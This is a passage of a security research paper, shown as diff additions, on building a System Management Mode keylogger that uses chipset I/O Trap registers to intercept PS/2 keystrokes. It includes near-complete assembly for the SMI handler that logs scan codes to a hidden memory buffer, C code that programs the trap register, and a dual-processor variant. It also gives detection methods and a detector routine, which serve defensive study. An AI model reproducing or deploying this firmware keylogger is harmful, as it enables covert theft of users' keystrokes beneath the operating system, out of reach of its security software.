+Windows NT Operating System and for multi-language keyboards. Also this
+option provides the PS/2 functionalities like keyboard lock, password
+setting, scan code selection etc to USB keyboards.
+
+[/snip]
+
+So to use it for "other" purposes we need to understand what mechanism
+this feature is built upon. The mechanism should be supported by hardware
+so we need to search CPU and chipset specifications. The underlying
+mechanism is supported by both Intel and AMD processors and is referred to
+as "I/O Trap". AMD manual has a section "SMM I/O Trap and I/O Restart"
+[amd_man]. Intel manual describes it in sections "I/O State Implementation"
+and "I/O INSTRUCTION RESTART" [intel_man].
+
+I/O Trap feature allows SMI trapping on access to any I/O port using IN or
+OUT instructions and executing specific SMI handler. Reasoning behind this
+feature is to power on some device being accessed via some I/O port if
+it's powered off. Apparently, I/O Trap is also used for other features
+like emulating 60h/64h keyboard ports in SMI handler for the USB keyboard.
+
+So I/O Trap method is similar to debug trap mentioned above, it traps on
+access to I/O ports, but instead of invoking debug trap handler in OS
+kernel, it generates an SMI interrupt and CPU enters SMM and executes I/O
+Trap SMI handler.
+
+When processor traps I/O instruction and enters SMM mode, it saves all
+information about trapped I/O instruction in SMM Save State Map in the
+field "I/O State Field" at 0x8000 + 0x7FA4 offset from SMBASE. Below we
+provide contents of this field that our keylogger will later need to check:
+
+
+I/O State Field (SMBASE + 0x8000 + 0x7FA4):
++----------+----------+----------+------------+--------+
+| 31    16 | 15     8 | 7      4 | 3        1 | 0      |
++----------+----------+----------+------------+--------+
+| I/O Port | Reserved | I/O Type | I/O Length | IO_SMI |
++----------+----------+----------+------------+--------+
+
+- If set, IO_SMI (bit 0) indicates that this is a I/O Trap SMI.
+- I/O Length (bits [1:3]) indicates if I/O access was byte (001b), word
+  (010b) or dword (100b).
+- I/O Type (bits [4:7]) indicate type of I/O instruction, "IN imm"
+  (1001b), "IN DX" (0001b), etc.
+- I/O Port (bits [16:31]) contain I/O port number that has been accessed.
+
+As we will see in the next section, SMI keylogger will need to update
+saved EAX field in SMM Save State Map if this is IO_SMI, access to port
+0x60 is byte-wide and done via IN DX instruction. Specifically, SMI
+keylogger checks if I/O State field at 0x7FA4 offset has value 0x00600013:
+
+
+mov esi, SMBASE
+mov ecx, dword ptr fs:[esi + 0xFFA4]
+cmp ecx, 0x00600013
+jnz _not_io_smi
+
+
+Above check is simplified. SMI keylogger has to check other values of I/O
+Type and I/O Length bits in I/O State Field.
+
+(*) Remark: for a keylogger purposes, we are only interested in I/O Trap,
+but not in I/O Restart. For the sake of completeness, I/O Restart allows
+IN or OUT instruction, that was interrupted by SMI, to be re-executed
+(or "restarted") after resuming from SMM mode.
+
+It is possible to program I/O Trap on read or write to any I/O port which
+allows anyone to implement SMI handlers that will be invoked on variety of
+interactions between software and hardware devices. We are currently
+interested in trapping read access to keyboard controller data port 0x60.
+
+Let's describe details of how I/O trapping of key pressed on a keyboard
+works:
+
+1. When key is pressed, keyboard controller signals a hardware interrupt
+
+[..Here redirection of IRQ 1 to SMI by I/O APIC would take place..]
+
+2. After receiving hardware keyboard interrupt, APIC invokes keyboard
+interrupt handler routine in IDT (0x93 for PS/2 keyboard)
+
+3. At some point keyboard interrupt handler needs to read a scan code from
+keyboard controller buffer using data port 0x60
+
+[..In a clean system keyboard interrupt handler would decode scan code and
+display it on a screen or handle it normally, but in the hooked system..]
+
+4. Chipset traps read to port 0x60 and signals an I/O Trap SMI
+
+5. In SMM, keystroke logger SMI handler claims ownership of and handles
+this I/O Trap SMI
+
+6. Upon exit from SMM, keystroke logger SMI handler returns result of port
+0x60 read (current scan code) to keyboard interrupt handler in kernel for
+further processing
+
+We described all steps up to the last, step 6, where SMI keylogger returns
+intercepted data to the OS keyboard interrupt handler. Returning
+intercepted scan code is different in SMM keylogger using I/O Trap
+method than in SMM keylogger using I/O APIC. If APIC is used to trigger
+SMI (as in [smm_rkt]), SMI keylogger has to re-inject intercepted scan
+code because it has to be later read by OS keyboard interrupt handler.
+
+On the other side, SMM keylogger that uses I/O Trap method to intercept
+keystrokes traps "IN al, 0x60" instruction executed by OS keyboard
+interrupt handler. This IN instruction cannot be restarted upon resuming
+from SMM as it would cause an infinite loop of SMI traps. Instead, SMI
+handler has to return result of IN instruction in AL/AX/EAX register as if
+IN instruction wasn't trapped at all.
+
+EAX register is saved in SMM Save State Map in SMRAM at an offset 0x7FD0
+from SMBASE + 0x8000 in IA-32 [intel_man] or at an offset 0x7F5C in IA-64.
+So to return correct result of IN instruction our SMI keylogger will need
+to update EAX field with scan code read from port 0x60. Obviously, it
+should update EAX only in case if SMI# is IO_SMI as described above in
+this section.
+
+Let's modify the above snippet and add the code updating EAX:
+
+;
+; verify that this is IO_SMI due to read to 0x60 port
+; then update EAX in SMM state save area (SMBASE + 0x8000 + 0x7FD0)
+;
+mov esi, SMBASE
+mov ecx, dword ptr fs:[esi + 0xFFA4]
+cmp ecx, 0x00600013
+jnz _not_io_smi
+mov byte ptr fs:[esi + 0xFFD0], al
+_not_io_smi:
+; skip this SMI#
+
+
+For the sake of completeness, below we provide a snippet that re-injects
+scan code into keyboard controller buffer which would be used by SMM
+keylogger based on IRQ1 to SMI# APIC redirection:
+
+; read scan code from keyboard controller buffer
+in al, 0x60
+push ax
+; write command byte 0xD2 to command port 0x64
+; to re-inject intercepted scan code into keyboard controller buffer
+; so that OS keyboard interrupt can read and display it later
+mov al, 0xd2
+out 0x64, al
+; wait until keyboard controller is ready to read
+_wait:
+in al, 0x64
+test al, 0x2
+jnz _wait
+; re-inject scan code
+pop ax
+out 0x60, al
+
+
+We described all steps of I/O Trap feature. The next section describes how
+I/O Trap feature can be enabled for SMI keystroke logger to work.
+
+
+
+--[ 3.2 - Programming I/O Trap to capture keystrokes
+
+
+To enable and program I/O Trap mechanism we need to consult with chipset
+specifications. For example, Intel(r) I/O Controller Hub 10 (ICH10) Family
+datasheet [ich] specifies 4 registers IOTR0 - IOTR3 that can provide
+capability to trap access to I/O ports.
+
+IOTRn - I/O Trap Register (0-3)
+Offset Address: 1E80-1E87h Register 0 	Attribute: R/W
+		1E88-1E8Fh Register 1
+		1E90-1E97h Register 2
+		1E98-1E9Fh Register 3
+
+"These registers are used to specify the set of I/O cycles to be trapped
+and to enable this functionality."
+
+All I/O Trap registers are located in Root Complex Base Address Register
+(RCBA) space in ICH. Please refer to sections 10.1.46-49 of [ich] for
+details of I/O Trap registers.
+
+- I/O Trap 0-3 (IOTRn) registers are at the offsets 0x1E80 through 0x1E9F
+  from RCBA.
+- Trap Status Register (TRST) is at offset 1E00h from RCBA. Contains 4
+  status bits indicating that access was trapped by one of IOTRn traps.
+- Trapped Cycle Register (TRCR) is at offset 1E10h from RCBA. This
+  register contains data written to trapped I/O port. It's not used when
+  trapping read cycles.
+
+RCBA value can be read from ICH PCI configuration register B:D:F = 0:31:0,
+offset 0xF0.
+
+   //
+   // Read the Root Complex Base Address Register (RCBA)
+   //  
+
+   // LPC device in ICH, B:D:F = 0:31:0
+   lpc_rcba_addr = pci_addr( 0, 31, 0, LPC_RCBA_REG );
+   _outpd( 0xcf8, lpc_rcba_addr );
+   rcba_reg = _inpd( 0xcfc );
+   pa.LowPart = rcba_reg & 0xffffc000;
+
+   // 0x2000 is enough to access I/O Trap range
+   rcba = MmMapIoSpace( pa, 0x2000, MmCached );
+
+Each IOTRn register contains the following important bits that we'll need
+to use:
+
+Bit 0 	   Trap and SMI# Enable (TRSE)
+	   0 = Trapping and SMI# logic disabled.
+	   1 = The trapping logic specified in this register is enabled.
+..
+Bits 15:2  I/O Address[15:2] (IOAD)
+	   dword-aligned address
+..
+Bits 35:32 Byte Enables (TBE)
+	   Active-high dword-aligned byte enables.
+..
+Bit 48	   Read/Write# (RWIO)
+	   0 = Write
+	   1 = Read
+	   NOTE: The value in this field does not matter if bit 49 is set.
+
+To enable trapping read accesses to keyboard controller data port 0x60 one
+of IOTRn registers (for example, IOTR0) have to be programmed as follows:
+- lower DWORD of IOTR0 should be programmed to value 0x61 (IOAD = 0x60,
+  TRSE = 1)
+- higher DWORD of IOTR0 should be programmed to value 0x100f0 (TBE = 0xf,
+  RWIO = 1)
+
+A snippet of code that programs IOTR0 looks as follows:
+
+   //
+   // Program I/O Trap to trap on every read from
+   // keyboard controller data port 0x60
+   //
+
+   pIOTR0_LO = (DWORD *)(rcba + RCBA_IOTR0_LO);
+   pIOTR0_HI = (DWORD *)(rcba + RCBA_IOTR0_HI);
+
+   // trap on port read + all byte enables
+   *(DWORD*)pIOTR0_HI = 0x100f0;
+   // keyboard controller port 0x60 + 1 enable I/O Trap
+   *(DWORD*)pIOTR0_LO = 0x61;
+
+For a complete source code please refer to the end of the paper.
+
+In the next section we will describe full implementation of I/O Trap SMI
+handler used to trap on keyboard interrupts.
+
+Here we need to note the following. I/O Trap SMI handler needs to disable
+I/O Trap at the beginning of SMI handler and re-enable I/O Trap upon
+resuming from SMM. I/O Trap SMI handler should include these instructions:
+
+; I/O Trap Register 0 = RCBA + 1E80h
+IO_TRAP_IOTR0_REG	equ	FED1DE80h
+
+mov edx, IO_TRAP_IOTR0_REG
+mov dword ptr [edx], 0
+
+; handle I/O Trap SMI
+
+mov edx, IO_TRAP_IOTR0_REG
+mov eax, 0x61
+mov dword ptr [edx], eax
+
+The above code first disables SMI I/O Trap by writing 0 to FED1DE80h MMIO
+address (I/O Trap Register 0 = RCBA + 1E80h) and then after handling SMI,
+writes 0x61 value to this register to re-enable I/O trap on read access to
+port 0x60.
+
+
+At this point we should have everything we need to modify SMI handler and
+add a keystroke logger payload into SMM.
+
+
+
+--[ 3.3 - System Management Mode keylogger
+
+
+First thing to understand about SMI based keylogger is that it executes
+in the specific environment set up by BIOS and SMI code. Despite that the
+keylogger has similarities with kernel keylogger, it has a lot of SMI
+specifics.
+
+We tested described keylogger mechanism with only PS/2 keyboards.
+
+We'll be designing SMI keylogger to directly query keyboard controller
+data port 0x60 and read scan codes sent as interrupts when user presses or
+releases any key on a keyboard.
+
+Keyloggers that directly read port 0x60 typically need to re-inject read
+scan code back to keyboard controller buffer using the same data port 0x60
+such that software up in the stack can read and process this scan code
+without noticing that it was intercepted by the keylogger.
+
+In this paper we use I/O Trap mechanism to trigger SMI keylogger payload.
+I/O Trap mechanism does not require re-injecting scan codes. This will be
+explained later. Furthermore, keylogger will not work if it re-injects
+scan code.
+
+Below we provide an assembly of SMI keystroke logger payload based on I/O
+Trap method. It reads scan codes and dumps them to some physical address
+from where they can be extracted later. A complete code of SMI handler
+implementing I/O Trap based SMI keylogger will be provided in the next
+section.
+
+
+pusha
+
+;
+; verify that this is IO_SMI due to read to 0x60 port
+;
+mov esi, SMBASE
+mov ecx, dword ptr [esi + 0xFFA4]
+cmp ecx, 0x00600013
+jnz _not_io_smi
+
+;
+; read scan code from keyboard controller port 0x60
+;
+xor ax, ax
+in al, 60h
+
+;
+; log intercepted scan code (to LOG_BUFFER_PHYS_ADDR physical address)
+; the first dword is a number of scan code bytes saved in the buffer
+;
+mov edi, DST_BUF_PHYSADDR
+mov ecx, dword ptr [edi]
+push edi
+lea edi, dword ptr [edi + ecx + 4]
+mov byte ptr [edi], al
+
+;
+; increment number of scan code bytes saved in the buffer
+;
+inc ecx
+pop edi
+mov dword ptr [edi], ecx
+
+;
+; update EAX field in SMM state save map (SMBASE + 0x8000 + SMM_MAP_EAX)
+; with scan code to be returned as a result of trapped IN instruction
+;
+mov byte ptr [esi + 0xFFD0], al
+
+_not_io_smi:
+
+popa
+
+
+The next section provides full description of SMI handler that implements
+functions of SMM keylogger based on I/O Trap keystroke interception method.
+
+
+
+--[ 3.4 - I/O Trap based keystroke logger SMI handler
+
+
+From the description in the previous sections I/O Trap method works like
+this:
+
+1. CPU issues read or write to some I/O port.
+
+2. Chipset traps this access, decodes port number and width, read vs.
+write access and consults to I/O Trap registers programmed by kernel mode
+software.
+
+3. If I/O port access corresponds to programmed in I/O Trap registers,
+chipset asserts SMI# of the CPU.
+
+4. CPU enters System Management Mode an jumps to SMI handler that claims
+ownership of I/O Trap SMI.
+
+The way to use I/O Trap mechanism to log keystrokes entered on target
+system is to program chipset to trap on read to keyboard controller data
+port 0x60 and issue SMI# which will invoke SMI handler that will log scan
+code read from port 0x60.
+
+Once invoked, after read to port 0x60 was trapped, SMI keylogger should 
+take the following actions:
+
+1. Determine if SMI is due to an I/O Trap on read access to keyboard
+controller port.
+
+2. Clear I/O Trap status bit in TRST MMIO register at address 0xFED1DE00.
+
+3. Temporarily disable I/O Trap by clearing IOTRn register at 0xFED1DE80,
+because later it will need to read from the trapped port.
+
+4. Check in TRCR MMIO register at 0xFED1DE10 whether read or write to port
+was trapped.
+
+5. Read scan code from keyboard controller port 0x60 and store it somewhere
+in the keystroke log buffer to extract later or transmit it over the
+network.
+
+4. Update saved EAX register in SMM state save area with read scan code
+such that when SMI resumes to protected mode, correct scan code is
+returned to interrupted instructions in kernel keyboard interrupt handler
+routine.
+
+5. Re-enable I/O Trap on read access to keyboard controller port 0x60 by
+writing 0x61 to IOTRn register to enable trapping for the next keystroke
+after resuming from SMM to normal OS execution.
+
+6. Return from SMI handler code indicating to main SMI dispatch function
+that SMI was claimed and handled.
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;
+;; I/O Trap based SMI keystroke logger
+;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;
+; I/O Trap registers in Root Complex Base Address (RCBA)
+;
+IO_TRAP_IOTR0_REG	equ FED1DE80h ; I/O Trap Register 0 = RCBA + 1E80h
+IO_TRAP_TRSR_REG	equ FED1DE00h ; Trap Status Register = RCBA + 1E00h
+IO_TRAP_TRCR_REG	equ FED1DE10h ; Trapped Cycle Register = RCBA + 1E10h
+
+KBRD_DATA_PORT		equ 60h
+
+DST_BUF_PHYSADDR	equ 20000h    ; any physical address read later
+SEG_4G			equ ?         ; depends on BIOS
+
+;
+; IO_SMI bit, I/O Port = 0x60
+; I/O Type = IN DX
+; I/O Length = 1
+; should all be checked separately
+;
+IOSMI_IN_60_BYTE	equ 00600013h
+
+;
+; SMM Save State Map fields
+;
+SMM_MAP_IO_STATE_INFO	equ FFA4h
+SMM_MAP_EAX		equ FFD0h
+
+;
+; we need to load DS with index of 4G 0-based data segment in GDT
+; to be able to access any MMIO
+; or physical addresses for logging scan codes
+;
+push ds
+push SEG_4G
+pop ds
+
+;
+; clear I/O Trap status bit
+;
+mov eax, IO_TRAP_TRSR_REG
+mov dword ptr [eax], 1
+
+;
+; check TRCR if it's IO read or write
+; we trap only reads here
+;
+mov eax, IO_TRAP_TRCR_REG
+mov ebx, dword ptr [eax]
+bswap ebx
+and bh, 0xf
+and bl, 0x1
+jz _smi_handled
+
+;
+; temporarily disable I/O Trap
+;
+mov eax, IO_TRAP_IOTR0_REG
+mov dword ptr [eax], 0
+
+;;;;;;;;;;; 
+; keystroke logging goes here
+;;;;;;;;;;; 
+
+pusha
+
+;
+; verify that this is IO_SMI due to read to 0x60 port
+;
+mov esi, SMBASE
+mov ecx, dword ptr [esi + SMM_MAP_IO_STATE_INFO]
+cmp ecx, IOSMI_IN_60_BYTE
+jnz _not_io_smi
+
+;
+; read scan code from keyboard controller port 0x60
+;
+xor ax, ax
+in al, KBRD_DATA_PORT
+
+;
+; log intercepted scan code (to LOG_BUFFER_PHYS_ADDR physical address)
+; the first dword is a number of scan code bytes saved in the buffer
+;
+mov edi, DST_BUF_PHYSADDR
+mov ecx, dword ptr [edi]
+push edi
+lea edi, dword ptr [edi + ecx + 4]
+mov byte ptr [edi], al
+
+;
+; increment number of scan code bytes saved in the buffer
+;
+inc ecx
+pop edi
+mov dword ptr [edi], ecx
+
+;
+; update EAX field in SMM state save map (SMBASE + 0x8000 + SMM_MAP_EAX)
+; with scan code to be returned as a result of trapped IN instruction
+;
+mov byte ptr [esi + SMM_MAP_EAX], al
+
+_not_io_smi:
+
+popa
+
+;;;;;;;;;;; 
+
+;
+; re-enable I/O Trap on read from port 0x60
+;
+mov eax, IO_TRAP_IOTR0_REG
+mov ebx, KBRD_DATA_PORT+1
+mov dword ptr [eax], ebx
+
+;
+; return 0 indicating that SMI was handled
+;
+_smi_handled:
+
+pop ds
+mov eax, 0
+retf
+
+
+Above listing intentionally lacks one detail needed for this SMI handler
+to function correctly in ASUS/AMI BIOS to prevent from copy-pasting it.
+A bit more debugging should be sufficient to figure it out.
+
+
+
+--[ 3.5 - Multi-processor keylogger specifics
+
+
+We've seen in the previous section that I/O Trap based SMM keylogger has
+to update saved EAX (RAX) register in SMM Save State Map so that the
+processor could return it as a result of trapped IN instruction.
+
+In case of multi processor system multiple logical processors may enter
+SMM at the same time so they need their own SMM Save State Map allocated
+in SMRAM. This is typically solved by setting SMRAM base address (SMBASE)
+to a different value for each processor by the BIOS firmware (this is
+referred to as "SMBASE relocation").
+
+For example, in dual processor system, one logical processor may have
+SMBASE = SMBASE0 and another processor may have SMBASE = SMBASE0 + 0x300.
+In this case, the first processor starts executing SMI handler code at
+EIP = SMBASE0 + 0x8000 and the second at EIP = SMBASE0 + 0x8000 + 0x300.
+SMM Save State Map areas for both processors will start at
+(SMBASE0 + 0x8000 + 0x7F00) and (SMBASE0 + 0x8000 + 0x7F00 + 0x300).
+
+The following simple diagram illustrates SMRAM layout for 2 processors:
+
++ Processor 0 ---------------------------+ Processor 1 ---------------------------+
+|                                        |                                        |
+|                                        + SMBASE + 0xFFFF + 0x300 ---------------+
+|                                        |///////// SMM Save Sate area ///////////|
+|                                        + SMBASE + 0xFF00 + 0x300 ---------------+
++ SMBASE + 0xFFFF -----------------------+                                        |
+|///////// SMM Save Sate area ///////////|                                        |
++ SMBASE + 0xFF00 -----------------------+                                        |
+|                                        |                                        |
+|                                        |                                        |
+|                                        |        SMI Handler entry point         |
+|                                        + SMBASE + 0x8000 + 0x300 ---------------+
+|                                        |                                        |
+|        SMI Handler entry point         |                                        |
++ SMBASE + 0x8000 -----------------------+                                        |
+|                                        |                                        |
+|                                        |                                        |
+|                                        |                                        |
+|                                        |               SMRAM start              |
++                                        + SMBASE + 0x300 ------------------------+
+|                                        |                                        |
+|               SMRAM start              |                                        |
++ SMBASE --------------------------------+----------------------------------------+
+
+
+Instead of 0x300, BIOS may choose any offset to use to increment SMBASE
+for all processors. There is an easy way to determine it. SMM Save State
+Map should contain SMM Revision Identifier Field at 0x7EFC offset of
+SMBASE+0x8000 which should have the same value for each processor that
+entered SMM. For example, SMM Revision ID may be 0x30100. SMI handler can
+search for the same value of SMM Revision ID in SMRAM. An address of the
+next SMM Revision ID field minus address of the current SMM Revision ID
+field gives the offset that should be added to SMBASE to calculate SMBASE
+of the next processor.
+
+Below we demonstrate how SMM keylogger handler provided in the previous
+section could have been modified to support dual processor. The code below
+checks if I/O State Field has value matching to the correct I/O Trap for
+each processor and, if so, updates EAX of this processor in SMM Save State
+Map:
+
+;
+; update saved EAX registers in SMM state save maps of 2 processors
+;
+mov esi, SMBASE
+lea ecx, dword ptr [esi + SMM_MAP_IO_STATE_INFO]
+cmp ecx, IOSMI_IN_60_BYTE
+jne _skip_proc0:
+mov byte ptr [esi + SMM_MAP_EAX], al
+
+_skip_proc0:
+lea ecx, dword ptr [esi + SMM_MAP_IO_STATE_INFO + 0x300]
+cmp ecx, IOSMI_IN_60_BYTE
+jne _skip_proc1:
+mov byte ptr [esi + SMM_MAP_EAX + 0x300], al
+
+_skip_proc1:
+..
+
+
+
+--[ 4 - SUGGESTED DETECTION METHODS
+
+
+
+--[ 4.1 - Detecting I/O Trap based SMM keylogger
+
+
+Generally, as pointed in previous research, Operating System does not have
+access to SMRAM as soon as it's locked by BIOS firmware. So detecting
+malicious code inside SMRAM becomes a challenging task for the OS or
+anti-virus software.
+
+In many cases, however, it is not necessary to inspect SMRAM to detect the
+presence of SMM rootkit. Let's explain this thesis on keylogger example
+described earlier.
+
+To be able to intercept pressed keystrokes SMM keystroke logger has to
+modify hardware configuration in a certain way. In case of using I/O Trap
+method SMM keylogger has to enable I/O Trap to trap on IN/OUT instructions
+to keyboard controller ports 0x60 and 0x64.
+
+In case of using I/O APIC technique SMM keylogger has to change I/O APIC
+Redirection Table to program SMI# as a delivery mode of hardware interrupt
+IRQ #01, as pointed in [smm_rkt].
+
+As usual we'll focus on I/O Trap based SMM keylogger. If there is no
+legitimate port 0x60/0x64 emulation used and I/O Trap is enabled to trap
+on keyboard ports then this is a clear indication of SMM keylogger. So to
+detect this keylogger we need to detect that I/O Trap has been programmed
+to trap on access to keyboard controller I/O ports 0x60 and 0x64.
+
+For example, the snippet below detects that I/O Trap is programmed to trap
+on reads from port 0x60:
+
+ pIOTR0_LO = (DWORD *)(rcba + RCBA_IOTR0_LO);
+
+ // keyboard controller port 0x60 + 1 enable I/O Trap
+ if(0x61 == (*(DWORD*)pIOTR0_LO)) {
+   DbgPrint("SMM keylogger detected.
+             Found enabled I/O Trap on keyboard port 60h\n");
+ }
+
+If I/O Trap is detected it's trivial to disable it. We simply need to
+write 0x0 to IOTR0 register.
+
+
+
+--[ 4.2 - General timing based detection
+
+
+Another possible method to detect I/O Trap based SMM keylogger is to
+measure timing difference between IN/OUT instructions that access keyboard
+controller ports vs. other I/O ports. As access to some or all keyboard
+ports is trapped by SMI handler then it will take (much) longer to return
+results of IN/OUT instructions. For example, profiling "IN 60h" could be:
+
+ RDTSC
+ IN AL, 60H
+ RDTSC
+
+It should be noted that all variants of IN instruction should be profiled
+like "IN AL, 60H", "IN AX, DX" etc., because I/O Trap may be programmed to
+intercept only certain variants.
+
+
+
+--[ 5 - CONCLUSION
+
+
+This work described details of how SMI handlers are implemented in BIOS
+system firmware and how to disassemble and modify them. The authors hope
+that this paper added some clarity to how malware could use SMI handlers
+to add rootkit functionality in SMM and, more importantly, how to detect
+such stealthy malware.
+
+It would be naive to assume that SMM is secure as long as BIOS firmware
+"locks down" SMM memory by setting D_LCK bit in SMRAMC register (original
+attack from [smm]). Other vulnerabilities already found in SMM protections
+as demonstrated in [xen_0wn].
+
+SMI handlers may also change from BIOS to BIOS, may be updated with the
+rest of BIOS firmware using BIOS update mechanism available for all
+motherboards, may be extended with lots of new features (even with new
+security features [xen_0wn]). Migration to (U)EFI will simplify EFI
+firmware development and may cause even more functionality to be added
+to EFI SMI handlers in SMM. Additionally, SMI handlers should interact
+with unprotected OS and drivers. The bottom line is that we believe the
+main danger will come from software vulnerabilities in SMI handlers' code
+similarly to vulnerabilities in OS kernel, drivers and applications. BIOS
+vendors should start paying better attention to what they are putting
+into the SMM.
+
+
+
+--[ 6 - SOURCE CODE
+
+
+--[ 6.1 - System Management Mode keylogger that uses I/O Trap mechanism
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;
+;; I/O Trap based SMI keystroke logger
+;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;
+; I/O Trap registers in Root Complex Base Address (RCBA)
+;
+IO_TRAP_IOTR0_REG	equ FED1DE80h ; I/O Trap Register 0 = RCBA + 1E80h
+IO_TRAP_TRSR_REG	equ FED1DE00h ; Trap Status Register = RCBA + 1E00h
+IO_TRAP_TRCR_REG	equ FED1DE10h ; Trapped Cycle Register = RCBA + 1E10h
+
+KBRD_DATA_PORT          equ 60h
+
+DST_BUF_PHYSADDR        equ 20000h    ; any physical address read later
+SEG_4G			equ ?         ; depends on BIOS
+
+;
+; IO_SMI bit, I/O Port = 0x60
+; I/O Type = IN DX
+; I/O Length = 1
+; should all be checked separately
+;
+IOSMI_IN_60_BYTE       equ 00600013h
+
+;
+; SMM Save State Map fields
+;
+SMM_MAP_IO_STATE_INFO  equ FFA4h
+SMM_MAP_EAX            equ FFD0h
+
+;
+; we need to load DS with index of 4G 0-based data segment in GDT
+; to be able to access any MMIO
+; or physical addresses for logging scan codes
+;
+push ds
+push SEG_4G
+pop ds
+
+;
+; clear I/O Trap status bit
+;
+mov eax, IO_TRAP_TRSR_REG
+mov dword ptr [eax], 1
+
+;
+; check TRCR if it's IO read or write
+; we trap only reads here
+;
+mov eax, IO_TRAP_TRCR_REG
+mov ebx, dword ptr [eax]
+bswap ebx
+and bh, 0xf
+and bl, 0x1
+jz _smi_handled
+
+;
+; temporarily disable I/O Trap
+;
+mov eax, IO_TRAP_IOTR0_REG
+mov dword ptr [eax], 0
+
+;;;;;;;;;;; 
+; keystroke logging goes here
+;;;;;;;;;;; 
+
+pusha
+
+;
+; verify that this is IO_SMI due to read to 0x60 port
+;
+mov esi, SMBASE
+mov ecx, dword ptr [esi + SMM_MAP_IO_STATE_INFO]
+cmp ecx, IOSMI_IN_60_BYTE
+jnz _not_io_smi
+
+;
+; read scan code from keyboard controller port 0x60
+;
+xor ax, ax
+in al, KBRD_DATA_PORT
+
+;
+; log intercepted scan code (to LOG_BUFFER_PHYS_ADDR physical address)
+; the first dword is a number of scan code bytes saved in the buffer
+;
+mov edi, DST_BUF_PHYSADDR
+mov ecx, dword ptr [edi]
+push edi
+lea edi, dword ptr [edi + ecx + 4]
+mov byte ptr [edi], al
+
+;
+; increment number of scan code bytes saved in the buffer
+;
+inc ecx
+pop edi
+mov dword ptr [edi], ecx
+
+;
+; update EAX field in SMM state save map (SMBASE + 0x8000 + SMM_MAP_EAX)
+; with scan code to be returned as a result of trapped IN instruction
+;
+mov byte ptr [esi + SMM_MAP_EAX], al
+
+_not_io_smi:
+
+popa
+
+;;;;;;;;;;; 
+
+;
+; re-enable I/O Trap on read from port 0x60
+;
+mov eax, IO_TRAP_IOTR0_REG
+mov ebx, KBRD_DATA_PORT+1
+mov dword ptr [eax], ebx
+
+;
+; return 0 indicating that SMI was handled
+;
+_smi_handled:
+
+pop ds
+mov eax, 0
+retf
+
+
+
+--[ 6.2 - Programming I/O Trap
+
+
+#define LPC_RCBA_REG	0xF0
+
+#define RCBA_IOTR0_LO	0x1E80 // I/O Trap 0 Register (IOTR0) low dword
+#define RCBA_IOTR0_HI	0x1E84 // I/O Trap 0 Register (IOTR0) high dword
+
+#define pci_addr(bus,dev,fn,reg) \
+          (0x80000000 |          \
+          ((bus & 0xff) << 16) | \
+          ((dev & 0x1f) << 11) | \
+          ((fn & 7) << 8) |      \
+          (reg & 0xfc))
+
+void _set_keystroke_io_trap()
+{
+   unsigned long lpc_rcba_addr;
+   unsigned long rcba_reg;
+   void *rcba;
+
+   DWORD * pIOTR0_LO;
+   DWORD * pIOTR0_HI;
+
+   //
+   // Read the Root Complex Base Address Register (RCBA)
+   //
+
+   // LPC device in ICH, B:D:F: = 0:31:0
+   lpc_rcba_addr = pci_addr(0, 31, 0, LPC_RCBA_REG);
+
+   _outpd(0xcf8, lpc_rcba_addr);
+   rcba_reg = _inpd(0xcfc);
+   pa.LowPart = rcba_reg & 0xffffc000;
+   DbgPrint("RCBA base physical address: 0x%08x\n", pa.LowPart);
+
+   // 0x2000 is enough to access I/O Trap range
+   rcba = MmMapIoSpace(pa, 0x2000, MmCached);
+
+   //
+   // Program I/O Trap to trap on every read from
+   // keyboard controller data port 0x60
+   //
+
+   pIOTR0_LO = (DWORD *)(rcba + RCBA_IOTR0_LO);
+   pIOTR0_HI = (DWORD *)(rcba + RCBA_IOTR0_HI);
+
+   // trap on port read + all byte enables
+   *(DWORD*)pIOTR0_HI = 0x100f0;
+   // keyboard controller port 0x60 + 1 enable I/O Trap
+   *(DWORD*)pIOTR0_LO = 0x61;
+   DbgPrint("IOTR0 = 0x%08x%08x at 0x%08x\n",
+            *pIOTR0_HI, *pIOTR0_LO, (pa.LowPart + RCBA_IOTR0_LO));
+
+}
+
+
+
+--[ 6.3 - Detecting I/O Trap SMI keystroke logger
+
+
+void _detect_keystroke_io_trap()
+{
+   unsigned long lpc_rcba_addr;
+   unsigned long rcba_reg;
+   void *rcba;
+
+   DWORD * pIOTR0_LO;
+   DWORD * pIOTR0_HI;
+
+   //
+   // Read the Root Complex Base Address Register (RCBA)
+   //
+
+   // LPC device in ICH, B:D:F: = 0:31:0
+   lpc_rcba_addr = pci_addr(0, 31, 0, LPC_RCBA_REG);
+
+   _outpd(0xcf8, lpc_rcba_addr);
+   rcba_reg = _inpd(0xcfc);
+   pa.LowPart = rcba_reg & 0xffffc000;
+
+   // 0x2000 is enough to access I/O Trap range
+   rcba = MmMapIoSpace(pa, 0x2000, MmCached);
+
+   pIOTR0_LO = (DWORD *)(rcba + RCBA_IOTR0_LO);
+   pIOTR0_HI = (DWORD *)(rcba + RCBA_IOTR0_HI);
+
+   // keyboard controller port 0x60 + 1 enable I/O Trap
+   if(0x61 == (*(DWORD*)pIOTR0_LO))
+   {
+     DbgPrint("SMM keylogger detected.
+               Found enabled I/O Trap on keyboard data port 60h\n");
+     // Disable I/O Trap SMM keylogger
+     // clear low dword of IOTRn register
+     *(DWORD*)pIOTR0_LO = 0;
+   }
+}
+
+
+--[ 7 - REFERENCES
+
+
+[smm_rkt]	A New Breed of Rootkit: The System Management Mode (SMM) Rootkit
+		Shawn Embleton, Sherri Sparks, Cliff Zou. Black Hat USA 2008
+		http://www.eecs.ucf.edu/~czou/research/SMM-Rootkits-Securecom08.pdf
+                http://www.tucancunix.net/ceh/bhusa/BHUSA08/speakers/Embleton_Sparks_SMM_Rookits/
+                BH_US_08_Embleton_Sparks_SMM_Rootkits_WhitePaper.pdf 
+ 
+
+[smm]		Using CPU System Management Mode to Circumvent Operating System Security Functions.
+		Loic Duflot, Daniel Etiemble, Olivier Grumelard. CanSecWest 2006
+		http://www.ssi.gouv.fr/fr/sciences/fichiers/lti/cansecwest2006-duflot-paper.pdf
+
+[phrack_smm]	Using SMM for 'Other Purposes'.
